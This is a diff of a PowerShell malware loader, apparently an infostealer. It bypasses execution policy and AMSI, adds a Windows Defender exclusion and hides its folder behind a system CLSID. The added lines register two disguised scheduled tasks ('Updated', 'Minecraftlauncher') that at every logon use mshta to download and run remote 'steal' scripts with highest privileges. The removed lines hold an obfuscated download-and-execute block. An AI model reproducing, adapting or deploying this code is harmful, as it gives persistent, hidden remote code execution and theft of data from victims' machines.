@@ -7,13 +7,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 Add-Type -AssemblyName System.Windows.Forms
 
-$skid = "skid"
 
-if ($env:USERDOMAIN -eq "DESKTOP-S4G27N7") {
-    $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/spam.ps1")
-    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-    Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-}
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -51,20 +45,22 @@ $bytes = (New-Object Net.WebClient).DownloadData($url)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 [Bypass]::amsi()
 
-$rdir = "C:\Users\Loader"
+$rdir = "$env:localappdata\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
 New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-$temp = "$dir\temp"
-New-Item -ItemType Directory -Path $temp
+$task_name = "Updated"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/startup-steal.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Simple update windows" -RunLevel Highest -Force
 
-Add-MpPreference -ExclusionPath $dir
+$task_name = "Minecraftlauncher"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/steal.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Launcher minecraft" -RunLevel Highest -Force
 
-Start-Process powershell -ArgumentList '-nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/refs/heads/main/scr/startup-steal.ps1 | iex"' -NoNewWindow -WindowStyle Hidden
-
-# if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
-#     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
-#     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
-#     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-# }
